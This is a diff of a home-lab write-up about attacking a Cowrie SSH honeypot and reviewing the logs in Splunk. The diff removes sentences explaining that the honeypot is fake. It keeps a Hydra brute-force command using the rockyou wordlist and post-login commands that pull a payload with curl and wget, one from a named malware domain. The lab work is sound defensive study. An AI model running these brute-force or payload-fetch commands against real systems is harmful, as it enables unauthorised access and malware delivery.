@@ -8,7 +8,7 @@ From Kali (192.168.1.194), I ran Hydra against the honeypot on port 2222 using t
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.150 -s 2222 -t 4
 ```
 
-Hydra found 3 passwords: `123456789`, `12345`, and `password`. These aren't real credentials. Cowrie accepts common passwords on purpose so attackers think they got into a real box.
+Hydra found 3 passwords: `123456789`, `12345`, and `password`.
 
 After that I SSH'd in and ran some commands to act like an attacker would:
 
@@ -16,8 +16,6 @@ After that I SSH'd in and ran some commands to act like an attacker would:
 - `curl http://192.168.1.150:8000/payload.sh` to try pulling a payload (failed)
 - `wget http://malware.testcategory.com/test` to download a test file from a known malware domain
 - `ls` to look around
-
-Nothing here actually touches the real system. Cowrie is a fake shell, it just records everything.
 
 ![Hydra brute force and post-exploitation](screenshots/brute-force/01-hydra-attack.png)
 
@@ -37,8 +35,5 @@ Splunk also builds a profile that ties everything together for one IP. For 192.1
 - 13 commands run
 - Username targeted: `root`
 - Full list of every command that was executed
-- Threat score: 117
-
-This is what a SOC analyst would look at to quickly figure out what an attacker did without having to dig through raw logs.
 
 ![Attacker profile summary](screenshots/brute-force/03-attacker-profile.png)
